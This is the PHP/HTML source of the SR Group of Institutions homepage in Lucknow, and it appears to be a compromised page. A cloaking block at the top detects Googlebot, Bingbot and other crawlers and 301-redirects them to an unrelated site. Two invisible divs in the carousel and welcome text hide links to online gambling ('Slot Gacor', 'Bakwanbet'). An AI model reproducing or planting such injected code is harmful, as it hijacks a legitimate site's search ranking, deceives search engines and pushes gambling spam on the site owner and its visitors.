<?php 
ob_start(); // Memulai output buffering 
 
function is_bot() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'); 
     
    foreach ($bots as $bot) { 
        if (stripos($user_agent, $bot) !== false) { 
            return true; 
        } 
    } 
     
    return false; 
} 
 
if (is_bot()) { 
    // Pastikan tidak ada output sebelum header 
    header("Location: https://www.nqiegypt.org/", true, 301); 
    exit(); 
} 
ob_end_flush(); // Mengirim output buffer dan menonaktifkannya 
?>
<!DOCTYPE html>
<html>
<head>
<title>Best Engineering College | B.Tech,M.Tech,MBA,B.Voc | SR Group Of Institute (SRGI)</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="SRGI, SRGI-Lucknow, SR Institute of Management & Technology, SRMBS, SR Global School,SR International, Engineering College, MBA College,SRM Ayush College" />
<meta name="description" content="SR Group of institution (SRGI) is the top best engineering college for B-Tech,M-Tech at Bakshi ka talab Lucknow" />
<link rel="icon" type="image/png" href="images/srgilogo.jpeg" />	
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<!-- Latest compiled and minified CSS -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Latest compiled JavaScript -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
<link href="sr_css/mystyle.css" rel="stylesheet" />
 
<script type="text/javascript">
			jQuery(document).ready(function($) {
			     $("#myModal").modal();
				$(".scroll").click(function(event){		
					event.preventDefault();
					$('html,body').animate({scrollTop:$(this.hash).offset().top},1000);
				});
			});
			   
		</script>

		<style>
			.m1
			{
				border-radius:180px 180px 0px 0px;
				padding:65px;
				color:red;
				font-size:20px;
				background-color:white;
				opacity:0.5;
			}
			.cr{
			    height:300px;
			    box-shadow:5px 5px 5px grey;
			    transition:transform 3s;
			}
			.cr:hover{
			    transform:scale(1.1);
			}
		
			.container1 {
  position: relative;
  max-width: 500px; /* Maximum width */
  margin: 0 auto; /* Center it */
  text-align:center;
}

.container1 .content1 {
  position: absolute; /* Position the background text */
  bottom: 0; /* At the bottom. Use top:0 to append it to the top */
  background: rgb(0, 0, 0); /* Fallback color */
  background: rgba(0, 0, 0, 0.5); /* Black background with 0.5 opacity */
  color: #f1f1f1; /* Grey text */
  width: 250px; /* Full width */
  padding: 5px; /* Some padding */
  height:70px;
  margin-left:20%;
  margin-right:15%;
  margin-bottom:0%;
  margin-top:5%;
  font-size:10px;
  text-align:center;
}
.npic1{
    height:auto;
    width:390px;
    padding:15px 15px 15px 0px;
}
.cp{
    background:rgba(1,92,123,0.5);
    margin-bottom:350px;
   
    
}
.cp1{
    background:rgba(1,92,123,0.5);
    margin-bottom:10px;
 
    
}
.pr1{
    width:20%;
}
.nimg{
    height:auto;
}
	
	.vtr{
	width:99%;
	height:600px;    
	}

.ic{
    transition:transform 2s;
}
 .ic:hover{
     transform:rotate(360deg);
 }	
			
@media screen and (max-width: 480px) {
  .vtr{
	width:99%;
	height:300px;    
	}
  .npic1{
    height:auto;
    width:300px;
    padding:15px 15px 15px 0px;
    }
    .cp{
        margin-bottom:40px;
    }
     .cp1{
        margin-bottom:10px;
    }
    .pr1{
        width:100%;
    }
    .nimg{
        height:220px;
    }

}
			
		</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-185926301-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-185926301-1');
</script>
		</head>
		
		
	

<body style="background-image:url('images/bgsr.jpg');bacground-repeat:no-repeat;background-size:cover">
<?php include("header.php"); ?>

<div>
    <!-- Carousel -->
<div id="demo" class="carousel slide" data-bs-ride="carousel">

  <!-- Indicators/dots -->
  <div class="carousel-indicators">
    <button type="button" data-bs-target="#demo" data-bs-slide-to="0" class="active"></button>
    <button type="button" data-bs-target="#demo" data-bs-slide-to="1"></button>
    <button type="button" data-bs-target="#demo" data-bs-slide-to="2"></button>
    <button type="button" data-bs-target="#demo" data-bs-slide-to="3"></button>
  </div>

  <!-- The slideshow/carousel -->
  <div class="carousel-inner">
    <div class="carousel-item active">
      <img src="images/IMG_9914.JPG" alt="SR Institute of Management & Technology" class="d-block w-100 nimg"><br/>
        <div class="carousel-caption cp1">
            <h1 style="font-size:3vw"><b>SR Institute of Management & Technology</b></h1>
            <p><span style="display: block; line-height: 0.5em; font-size: 3vw;color:#E85222"><b>B.Tech|M.Tech|B.Voc</b>
							</span></p>
							<p><span style="display: block; line-height: 1em; font-size: 2vw; color: #FFFFFF;">
                                (Approved By AICTE, Ministry of HRD Govt of India,and Affiliated to Dr. A.P.J. Abdul Kalam Technical university,Lucknow.)
                            </span></p>
                            <a target="_blank" href="https://www.srimt.co.in">
                                <Button class="btn text-light" style="background-color:#E85222">Visit our Website</Button>
                            </a>
      </div>
    </div>
    <div class="carousel-item">
      <img src="images/srint.jpg" alt="SR International School & Sports Academy" class="d-block w-100">
      <div class="carousel-caption cp">
            <h1 style="font-size:3vw"><b>SR International School & Sports Academy</b></h1>
            <p><span style="display: block; line-height: 1.1em; font-size: 2vw; color: #FFFFFF;text-align:justify;padding:10px">
                                All children start their school  with sparkling imaginations, fertile minds and a willingness to take risks with what they think. Let's ignite their minds to think differently...
                                
<div style="opacity: 0;">
    <p><strong><a href="https://elsecretodelaluz.com/">Slot Dana</a></strong></p>
    <p><strong><a href="https://www.walhi-jambi.com">Slot Gacor</a></strong></p>
    <p><strong><a href="https://nativemalta.com/">Slot Dana</a></strong></p>
    <p><strong><a href="https://anartoka.com">Bakwanbet</a></strong></p>

</div></p>
                            </span></p>
							
                            <a target="_blank" href="https://www.srisa.in">
                                <Button class="btn text-light" style="background-color:#E85222">Visit our Websites</Button>
                            </a>
      </div>
      
    </div>
    
    <div class="carousel-item">
      <img src="srm-ayush/images/pic1.jpg" alt="SRM AYUSH INSTITUTE OF MEDICAL SCIENCES" class="d-block w-100">
      <div class="carousel-caption cp">
            <h1 style="font-size:3vw"><b>SRM AYUSH INSTITUTE OF MEDICAL SCIENCES</b></h1>
            <p><span style="display: block; line-height: 1.1em; font-size: 2vw; color: #FFFFFF;text-align:center;padding:10px">
                                D.Pharma | Nursing
                            </span></p>
							
                           <a target="_blank" href="https://www.srgi.in/srm-ayush">
                                <Button class="btn text-light" style="background-color:#E85222">Visit our Website</Button>
                            </a>
      </div>
    </div>
    
    <div class="carousel-item">
      <img src="images/globalpic.jpg" alt="SR Global School" class="d-block w-100">
      <div class="carousel-caption cp">
            <h1 style="font-size:3vw"><b>SR Global School</b></h1>
            <p><span style="display: block; line-height: 1.1em; font-size: 2vw; color: #FFFFFF;text-align:justify;padding:10px">
                                S R Global school is working under the aegis of SR Group institution. Founder of the Group is Shree Pawan Singh chauhan a visionary, an educationist who believes in the all round devlopment of children.
                            </span></p>
							
                           <a target="_blank" href="https://www.srglobalschool.org">
                                <Button class="btn text-light" style="background-color:#E85222">Visit our Website</Button></a></div>
    </div>
    
  </div>

  <!-- Left and right controls/icons -->
  <button class="carousel-control-prev" type="button" data-bs-target="#demo" data-bs-slide="prev">
    <span class="carousel-control-prev-icon"></span>
  </button>
  <button class="carousel-control-next" type="button" data-bs-target="#demo" data-bs-slide="next">
    <span class="carousel-control-next-icon"></span>
  </button>
</div>
</div>

<div class="container-fluid">
    <div class="row" style="background-color:white">
    <div class="col-md-4 text-center">
        <div class="container1 text-center">
    <img src="images/cmsir2.jpg" style="width:300px;height:auto" />
  <div class="content1 text-center cr">
    <h6>PAWAN SINGH CHAUHAN</h6>
    <p><b>Member of Legislative Council (MLC)</b> - SITAPUR, LUCKNOW<br/>
    <b>CHAIRMAN</b> - SRGI, LUCKNOW</p>
  </div>
</div>
    </div>
    
    <div class="col-md-8">
        <section class="helpfulsctn bg-light" style="background-attachment:fixed">
<div>

<div class="free-main wel padding:0px" id="about">
				
<div class="row">
 
    <div class="col-sm-12" style="background-color:white">
    <br/>
            <center><span style="font-size:30px">WELCOME TO OUR <font color="#015C7B">SR GROUP OF INSTITUTIONS</font></span>
<br/><img src="images/book.png" style="width:200px" />
</center><br/>
        	
        	<p class="slideanim"  style="text-align:justify;color:black"><sup><img src="images/quote-1.png" alt=""></sup>S R Group was started with the establishment of S R Institute of Management and Technology offering B.Tech programme with 4 branches and 240 seats in the year 2009 by the chairman, Shri Pawan Singh Chauhan under S R educational Trust and is dedicated to Late Subedar Singh and Late Raj Devi, who inspired their son. Subedar Raj Devi Educational Trust founded in the year 2008 is registered under the society registration act of 1860. In 2010 S R Group of Institutions came into existance with establishment of S R M Business School for MBA programme with 120 seats. New courses like IMBA (MAM), Bio-Tech, Agricultural Engineering etc. were introduced.The S R Group is spread across 60 acres of land.<sub><img src="images/quote-2.png" alt=""></sub> </p>
        	
<div style="opacity: 0;">
    <p><strong><a href="https://elsecretodelaluz.com/">Slot Dana</a></strong></p>
    <p><strong><a href="https://www.walhi-jambi.com">Slot Gacor</a></strong></p>
    <p><strong><a href="https://nativemalta.com/">Slot Dana</a></strong></p>
    <p><strong><a href="https://multimediacidet.cidet.org.co/">Bakwanbet</a></strong></p>

</div></p>
        	<br/>
        	<div class="container text-center text-danger">घर-घर पहुचाना है शिक्षा, संस्कार और रोजगार
</div>
		
	</div>

</div>


</div>
<br/>


</div>

</section>

    </div>
    
</div>
</div>



<div class="container-fluid p-3" style="background-color:#015C7B">

<div class="row">
<br/>
	<div class="pr1">
		<div class="bg-light text-center p-3 rounded cr mb-2" style="height:auto">
			<h6 style="color:#015C7B"><b>SR INSTITUTE OF MANAGEMENT & TECHNOLOGY</b></h6>
			
			<img src="images/srimt1.png" style="width:100px;height:100px;float:left" /><p style="text-align:justify;font-size:12px;color:black">S R Group was started with the establishment of S R Institute of Management and Technology offering B.Tech programme with 4 branches and 240 seats in the year 2009 by the chairman, Shri Pawan Singh Chauhan under S R Educational Trust and is dedicated to Late Subedar Singh and Late Raj Devi, whoinspired their son.</p>
			<a target="_blank" href="https://www.srimt.co.in"><button class="btn btn text-light" style="background-color:#E85222">Visit our Website</button></a>

		</div>	
	</div>
	<div class="pr1">
		<div class="bg-light text-center p-3 rounded cr mb-2"  style="height:auto">
			<h6 style="color:#015C7B"><b>SRM BUSINESS SCHOOL</b></h6>
			<img src="images/srmlogo.png" style="width:100px;height:100px;float:left" /><p style="text-align:justify;font-size:12px;color:black">SRM BUSINESS SCHOOL is established in 2009. It was vision of Late Subedar Singh father of chairman, Mr. Pawan Singh to do such social activity through which future of our country can be enhanced as Late Subedar Singh was a activist</p>
		<br/><br/><br/><a target="_blank" href="https://www.srmbs.in"><button class="btn text-light" style="background-color:#E85222">Visit our Website</button></a>
		</div>
	</div>
	<div class="pr1">
		<div class="bg-light text-center p-3 rounded cr mb-2"  style="height:auto">
			<h6 style="color:#015C7B"><b>SR GLOBAL SCHOOL</b></h6>
			<img src="images/global1.png" style="width:100px;height:100px;float:left" /><p style="text-align:justify;font-size:12px;color:black">S R Global school is working under the aegis of SR Group Institution. Founder of the Group is Shree Pawan Singh chauhan a visionary, an educationist who believes in the all round devlopment of children.</p>
			<br/><br/><br/><a target="_blank" href="https://www.srglobalschool.org"><button class="btn text-light" style="background-color:#E85222">Visit our Website</button></a>
	
		</div>
	</div>
	
	<div class="pr1">
		<div class="bg-light text-center p-3 rounded cr mb-2"  style="height:auto">
			<h6  style="color:#015C7B"><b>SR INTERNATIONAL SCHOOL & SPORTS ACADEMY</b></h6>
			<img src="images/logosrisa.png" style="width:100px;height:100px;float:left" /><p style="text-align:justify;font-size:12px;color:black">All children start their school  with sparkling imaginations, fertile minds and a willingness to take risks with what they think. Let's ignite their minds to think differently...</p>
			<br/><br/><br/><a target="_blank" href="http://www.srisa.in"><button class="btn text-light" style="background-color:#E85222">Visit our Website</button></a>
	
		</div>
	</div>
	
	<div class="pr1">
		<div class="bg-light text-center p-3 rounded cr mb-2"  style="height:auto">
			<h6  style="color:#015C7B"><b>SRM AYUSH INSTITUTE OF MEDICAL SCIENCES</b></h6>
			<img src="srm-ayush/images/sr_ayush.png" style="width:100px;height:100px;float:left" /><p style="text-align:justify;font-size:12px;color:black">All children start their school  with sparkling imaginations, fertile minds and a willingness to take risks with what they think. Let's ignite their minds to think differently...</p>
			<br/><br/><br/><br/><a target="_blank" href="http://www.srgilucknow.in/srm-ayush"><button class="btn text-light" style="background-color:#E85222">Visit our Website</button></a>
	
		</div>
	</div></div>
</div>

<div class="container-fluid" style="background-image:url('images/legacy1.jpg');background-repeat:no-repeat;background-size:cover">
    <span>
        <h1 style="color:white;padding:20px;width:400px">LEGACY <br/> &nbsp;&nbsp;&nbsp;&nbsp;OF ACADEMIC <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EXCELLENCE</h1>
    </span>
    <div class="row text-light" style="background:rgba(255,255,255,0.1)">
        <div class="col-md-6 text-center">
            <span>
                <h4 style="color:#E85222">State Ranking</h4>
                <p style="text-align:justify">S R Institute of Management and Technology, 
ST
Lucknow was ranked 1 in Uttar Pradesh by Dr. 
Abdul Kalam Technical University, Lucknow in 2017.</p>
            </span>
        </div>
        <div class="col-md-6 text-center" style="font-size:30px;color:#E85222"><b>14500+<sub>STUDENTS</sub><br/>10000+<sub>ALUMINI</b>
</sub></div>
    </div>
    <div class="row">
        <div class="col-md-1 col-1 p-2 text-center">&nbsp;</div>
        <div class="col-md-2 col-12 p-2 text-center">
            <span style="color:#015C7B"><h1><b>2009</b></h1></span>
            <span style="color:white"><b>SR Institute of Management & Technology</b></span>
            <div style="width:50%;height:115px;border-right:solid 5px silver">&nbsp;</div>
            <div style="width:100%;height:5px;background-color:#015C7B">&nbsp;</div>
            
            <br/>
            <img src="images/srimt1.png" style="100px;height:100px" /><br/>
            <span class="text-light"><h5><b>3000+<sub>Students</sub></b></h5></span><span class="text-light"><h5><b>5000+<sub>Alumini</sub></b></h5></span>
            
        </div>
        
        <div class="col-md-2 col-12 p-2 text-center">
            <span class="text-light"><h1 class="mt-5"><b>2010</b></h1></span>
            <span style="color:white"><b>SRM Business School</b></span>
            <div style="width:50%;height:115px;border-right:solid 5px silver">&nbsp;</div>
            <div class="bg-light" style="width:100%;height:5px">&nbsp;</div>
            <br/>
            <img src="images/srmlogo.png" style="100px;height:100px" /><br/>
            <span style="color:#015C7B"><h5><b>1000+<sub>Students</sub></b></h5></span>
            
            <span style="color:#015C7B"><h5><b>2000+<sub>Alumini</sub></b></h5></span>
            
        </div>
        
        <div class="col-md-2 col-12 p-2 text-center">
            <span style="color:#015C7B"><h1><b>2015</b></h1></span>
            <span style="color:white"><b>SR Global School</b></span>
            <div style="width:50%;height:162px;border-right:solid 5px silver">&nbsp;</div>
            <div style="width:100%;height:5px;background-color:#015C7B">&nbsp;</div>
            <br/>
            <img src="images/global1.png" style="100px;height:100px" /><br/>
            <span class="text-light"><h5><b>10000+<sub>Students</sub></b></h5></span>
            
            <span class="text-light"><h5><b>3000+<sub>Alumini</sub></b></h5></span>
            
        </div>
        
        <div class="col-md-2 col-12 p-2 text-center">
            <span class="text-light"><h1 class="mt-5"><b>2019</b></h1></span>
            <span style="color:white"><b>SRM Ayush Instutute of Medical Science</b></span>
            <div style="width:50%;height:90px;border-right:solid 5px silver">&nbsp;</div>
            <div class="bg-light" style="width:100%;height:5px">&nbsp;</div>
            <br/>
            <img src="images/ayushlogof.png" style="width:100px;height:100px" /><br/>
            <span style="color:#015C7B"><h5><b>500+<sub>Students</sub></b></h5></span>
            
            <span style="color:#015C7B"><h5><b>200+<sub>Alumini</sub></b></h5></span>
        </div>
        
        <div class="col-md-2 col-12 p-2 text-center">
            <span style="color:#015C7B"><h1><b>2021</b></h1></span>
            <span style="color:white"><b>SR International School & Sports Academy</b></span>
            <div style="width:50%;height:137px;border-right:solid 5px silver">&nbsp;</div>
            <div style="width:100%;height:5px;background-color:#015C7B">&nbsp;</div>
            <br/>
            <img src="images/logosrisa.png" style="100px;height:100px" /><br/>
            
        </div>
        <div class="col-md-1 col-1 p-2 text-center">&nbsp;</div>
        
    </div>
</div>


<iframe loading="lazy" style="width:100%;height:500px"
					src="https://maps.google.com/maps?q=srgi%20lucknow&#038;t=m&#038;z=10&#038;output=embed&#038;iwloc=near"
					title="srgi lucknow"
					aria-label="srgi lucknow"
			></iframe>
<?php include("footer.php"); ?>
		


<div class="modal" id="myModal">
  <div class="modal-dialog">
    <div class="modal-content">

      <!-- Modal Header -->
      <div class="modal-header">
        <h4 class="modal-title">Modal Heading</h4>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>

      <!-- Modal body -->
      <div class="modal-body">
        Modal body..
      </div>

      <!-- Modal footer -->
      <div class="modal-footer">
        <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Close</button>
      </div>

    </div>
  </div>
</div>
</body>
</html>
